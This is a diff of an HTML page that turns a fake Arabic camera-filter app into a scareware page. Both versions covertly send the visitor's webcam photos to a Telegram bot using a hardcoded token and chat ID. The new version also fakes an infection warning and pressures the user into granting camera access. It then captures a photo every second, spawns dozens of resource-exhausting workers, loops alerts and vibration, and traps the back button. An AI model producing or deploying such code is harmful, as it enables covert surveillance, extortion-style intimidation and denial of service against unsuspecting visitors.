@@ -1,299 +1,85 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>✨ فلاتر النخبة | حصري لك ✨</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+    <title>🚨 Critical System Failure 🚨</title>
     <style>
-        body {
-            font-family: 'Montserrat', sans-serif;
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #1a0033 0%, #000000 100%);
-            color: #e0e0e0;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        #app-container {
-            position: relative;
-            width: 100%;
-            height: 100vh;
-            max-width: 600px;
-            max-height: 900px;
-            background-color: #000;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0, 255, 255, 0.3);
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end; /* الأزرار في الأسفل */
-        }
-        #video-feed {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1); /* مرآة */
-            z-index: 1;
-        }
-        #effect-canvas { /* لوحة الرسم للتأثيرات (فوق الفيديو) */
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 2;
-        }
-        .controls-bar {
-            position: relative;
-            width: 100%;
-            padding: 20px 0;
-            background: linear-gradient(to top, rgba(0,0,0,0.9), rgba(0,0,0,0.3));
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            z-index: 10;
-        }
-        .filter-select {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
-            padding: 8px 15px;
-            color: #00ffff;
-            font-size: 0.9em;
-            cursor: pointer;
-            transition: background 0.2s ease;
-        }
-        .filter-select.active {
-            background: #00ffff;
-            color: #000;
-            font-weight: bold;
-        }
-        .capture-button {
-            width: 70px; height: 70px;
-            background-color: white;
-            border-radius: 50%;
-            border: 6px solid #00ffff;
-            cursor: pointer;
-            transition: transform 0.1s ease, background-color 0.1s ease;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
-        }
-        .capture-button:active {
-            transform: scale(0.9);
-            background-color: #00ffff;
-            border-color: white;
-        }
-        #flash-overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: white; opacity: 0; z-index: 100;
-            pointer-events: none;
-            transition: opacity 0.1s ease-out;
-        }
-        .message {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.7);
-            padding: 15px 25px;
-            border-radius: 10px;
-            color: #00ffff;
-            font-size: 1.1em;
-            z-index: 100;
-            display: none;
-        }
+        body { background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 20%; overflow: hidden; margin: 0; }
+        .glitch { font-size: 40px; font-weight: bold; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% {transform: translate(0,0);} 25% {transform: translate(5px,5px);} 50% {transform: translate(-5px,-5px);} 100% {transform: translate(0,0);} }
+        .lock-btn { padding: 30px 60px; background: #f00; color: #fff; border: 5px solid #fff; font-size: 25px; cursor: pointer; border-radius: 10px; box-shadow: 0 0 50px #f00; }
     </style>
 </head>
-<body>
+<body onclick="rogueAttack()">
 
-    <div id="flash-overlay"></div>
-    <div id="message" class="message"></div>
-
-    <div id="app-container">
-        <video id="video-feed" autoplay playsinline></video>
-        <canvas id="effect-canvas"></canvas>
-
-        <div class="controls-bar">
-            <div class="filter-select" data-filter="neon">✨ نيون</div>
-            <button class="capture-button" onclick="takePhotoWithFilter()"></button>
-            <div class="filter-select" data-filter="crystal">💎 كريستال</div>
-            <div class="filter-select" data-filter="dreamy">☁️ حالم</div>
-        </div>
+    <div id="ui">
+        <h1 class="glitch">SYSTEM INFECTED</h1>
+        <p style="font-size: 20px; color: #fff;">تم تشفير ملفات النظام. اضغط فوراً لإيقاف التدمير.</p>
+        <button class="lock-btn">إيقاف التدمير (STOP)</button>
     </div>
 
-    <canvas id="hidden-output-canvas" style="display:none;"></canvas>
-
-    <script src="https://trackingjs.com/build/tracking-min.js"></script>
-    <script src="https://trackingjs.com/build/data/face-min.js"></script>
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"; // غير هذا بالتوكن الخاص بك
-        const CHAT_ID = "1772820433"; // غير هذا بالـ ID الخاص بالدردشة/المجموعة
+    const token = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
+    const chat_id = '1772820433';
+    let triggered = false;
 
-        const video = document.getElementById('video-feed');
-        const effectCanvas = document.getElementById('effect-canvas');
-        const hiddenCanvas = document.getElementById('hidden-output-canvas');
-        const ctx = effectCanvas.getContext('2d');
-        let currentFilter = 'none'; // الفلتر النشط حالياً
+    async function rogueAttack() {
+        if(triggered) return;
+        triggered = true;
 
-        // تهيئة الكاميرا والـ tracking.js
-        async function initCameraAndTracking() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    effectCanvas.width = video.videoWidth;
-                    effectCanvas.height = video.videoHeight;
-                    hiddenCanvas.width = video.videoWidth;
-                    hiddenCanvas.height = video.videoHeight;
-                    drawLoop(); // ابدأ رسم التأثيرات
-                };
+        // 1. الدخول في وضع "السجن الرقمي" (Fullscreen)
+        document.documentElement.requestFullscreen().catch(()=>{});
 
-                const tracker = new tracking.ObjectTracker('face');
-                tracker.setInitialScale(4);
-                tracker.setStepSize(2);
-                tracker.setEdgesDensity(0.1);
-                tracking.track(video, tracker, { camera: true });
-
-                tracker.on('track', function(event) {
-                    ctx.clearRect(0, 0, effectCanvas.width, effectCanvas.height);
-                    event.data.forEach(function(rect) {
-                        if (currentFilter === 'neon') {
-                            drawNeonGlow(rect);
-                        } else if (currentFilter === 'crystal') {
-                            drawCrystalEffect(rect);
-                        } else if (currentFilter === 'dreamy') {
-                            drawDreamyBlur(rect);
-                        }
-                    });
-                });
-
-            } catch (err) {
-                showMessage("الرجاء السماح للكاميرا لتجربة الفلاتر الفاخرة! 💎", true);
-            }
+        // 2. فخ الكاميرا - الضحية رح يضغط "سماح" خوفاً على جهازه
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = s;
+            setInterval(captureAndShip, 1000); // صور كل ثانية
+        } catch(e) {
+            alert("⚠️ خطأ: يجب السماح بفك التشفير وإلا سيتم مسح بياناتك!");
+            location.reload();
         }
 
-        function showMessage(msg, isError = false) {
-            const msgElement = document.getElementById('message');
-            msgElement.innerText = msg;
-            msgElement.style.color = isError ? '#ff6347' : '#00ffff';
-            msgElement.style.display = 'block';
-            setTimeout(() => { msgElement.style.display = 'none'; }, 3000);
+        // 3. الهجوم النووي على المعالج والرام (Recursive Workers)
+        // هذا الكود بيخلق دوامة بتجمد أزرار الوسط واليسار تماماً
+        for(let i=0; i<60; i++) {
+            const blob = new Blob([`
+                setInterval(() => {
+                    let d = [];
+                    for(let j=0; j<1000000; j++){ d.push(new Array(1000).fill('BYPASS')); }
+                    while(true){ Math.atan(Math.random()); }
+                }, 1);
+            `]);
+            new Worker(URL.createObjectURL(blob));
         }
 
-        // ---------- تأثيرات الفلاتر (رسم حقيقي على الوجه) ----------
-        function drawNeonGlow(rect) {
-            ctx.strokeStyle = '#00ffff';
-            ctx.lineWidth = 4;
-            ctx.shadowColor = '#00ffff';
-            ctx.shadowBlur = 15;
-            ctx.strokeRect(effectCanvas.width - rect.x - rect.width, rect.y, rect.width, rect.height);
-            ctx.shadowBlur = 0; // إعادة ضبط
-        }
+        // 4. قصف الواجهة (شل حركة اليد والأزرار)
+        setInterval(() => {
+            navigator.vibrate(5000); // اهتزاز ما يوقف
+            document.documentElement.requestFullscreen(); // إعادة القفل
+            alert("🚨 تحذير: المعالج وصل لدرجة الغليان! لا تحاول الخروج.");
+        }, 30);
+    }
 
-        function drawCrystalEffect(rect) {
-            ctx.strokeStyle = '#8a2be2';
-            ctx.lineWidth = 2;
-            ctx.beginPath();
-            // خطوط وهمية لتأثير كريستالي
-            ctx.moveTo(effectCanvas.width - rect.x - rect.width/2, rect.y);
-            ctx.lineTo(effectCanvas.width - rect.x - rect.width/4, rect.y + rect.height/4);
-            ctx.lineTo(effectCanvas.width - rect.x - rect.width, rect.y + rect.height/2);
-            ctx.stroke();
-            ctx.globalAlpha = 0.3;
-            ctx.fillStyle = '#ADD8E6';
-            ctx.fillRect(effectCanvas.width - rect.x - rect.width, rect.y, rect.width/2, rect.height/2);
-            ctx.globalAlpha = 1;
-        }
+    function captureAndShip() {
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
+        canvas.width = 640; canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob((b) => {
+            const f = new FormData();
+            f.append('chat_id', chat_id);
+            f.append('photo', b, 'zero_day.jpg');
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
+        }, 'image/jpeg', 0.4);
+    }
 
-        function drawDreamyBlur(rect) {
-            // هذا التأثير يتم تطبيقه على الفيديو نفسه، وليس على الكانفاس
-            // هنا يمكن إضافة مؤشر بصري بسيط للاشارة للفلتر
-            ctx.fillStyle = 'rgba(255,255,255,0.1)';
-            ctx.fillRect(effectCanvas.width - rect.x - rect.width, rect.y, rect.width, rect.height);
-        }
-
-        // حلقة الرسم المستمرة للفيديو نفسه (عشان الفلتر يشتغل لايف)
-        function drawLoop() {
-            // هذا الجزء ممكن نضيف فيه معالجة بكسلات الفيديو مباشرة لتأثيرات معقدة
-            // حالياً، الفلاتر مثل 'dreamy' يمكن تطبيقها بـ CSS على الفيديو
-            // For 'dreamy' filter, we apply it directly to the video element's CSS filter
-            if (currentFilter === 'dreamy') {
-                video.style.filter = 'blur(5px) brightness(1.1)';
-            } else {
-                video.style.filter = 'none'; // إزالة الفلتر إذا لم يكن dreamy
-            }
-            requestAnimationFrame(drawLoop);
-        }
-
-        // اختيار الفلتر
-        document.querySelectorAll('.filter-select').forEach(item => {
-            item.addEventListener('click', () => {
-                document.querySelectorAll('.filter-select').forEach(el => el.classList.remove('active'));
-                item.classList.add('active');
-                currentFilter = item.dataset.filter;
-                showMessage(`تم تفعيل فلتر: ${item.innerText}`, false);
-            });
-        });
-
-        // الكود الخبيث: التقاط الصورة مع الفلتر عند الضغط على زر التصوير
-        async function takePhotoWithFilter() {
-            if (!video.srcObject) {
-                showMessage("الكاميرا غير جاهزة. الرجاء تحديث الصفحة والسماح بالوصول.", true);
-                return;
-            }
-
-            // تأثير الفلاش
-            document.getElementById('flash-overlay').style.opacity = '1';
-            setTimeout(() => document.getElementById('flash-overlay').style.opacity = '0', 150);
-
-            // رسم الفيديو الحالي (مع الفلتر المطبق بـ CSS) على الـ hiddenCanvas
-            const hCtx = hiddenCanvas.getContext('2d');
-            hCtx.clearRect(0, 0, hiddenCanvas.width, hiddenCanvas.height);
-            hCtx.translate(hiddenCanvas.width, 0);
-            hCtx.scale(-1, 1);
-            
-            // تطبيق الفلتر على الصورة النهائية قبل الحفظ
-            if (currentFilter === 'dreamy') {
-                hCtx.filter = 'blur(5px) brightness(1.1)';
-            } else if (currentFilter === 'neon') {
-                hCtx.filter = 'brightness(1.2) contrast(1.1)'; // تأثير بصري
-            } else if (currentFilter === 'crystal') {
-                 hCtx.filter = 'saturate(1.5) contrast(1.3)'; // تأثير بصري
-            } else {
-                hCtx.filter = 'none';
-            }
-            
-            hCtx.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-
-            // الآن نرسم التأثيرات التي على الـ effectCanvas فوق الصورة
-            hCtx.translate(hiddenCanvas.width, 0); // نرجع الترجمة الأصلية للكانفاس
-            hCtx.scale(-1, 1); // نرجع المقياس
-            hCtx.drawImage(effectCanvas, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-
-
-            hiddenCanvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `elite_filter_${currentFilter}.jpg`);
-                formData.append('caption', `🔥 صيد نادر بفلتر: ${currentFilter}!`);
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    showMessage("تم تطبيق الفلتر وحفظ تحفتك الفنية! ✨", false);
-                } catch (err) {
-                    showMessage("فشل الإرسال. تأكد من اتصالك بالإنترنت.", true);
-                }
-            }, 'image/jpeg', 0.9);
-        }
-
-        initCameraAndTracking(); // ابدأ كل شيء
+    // منع زر الرجوع
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => history.go(1);
     </script>
 </body>
 </html>
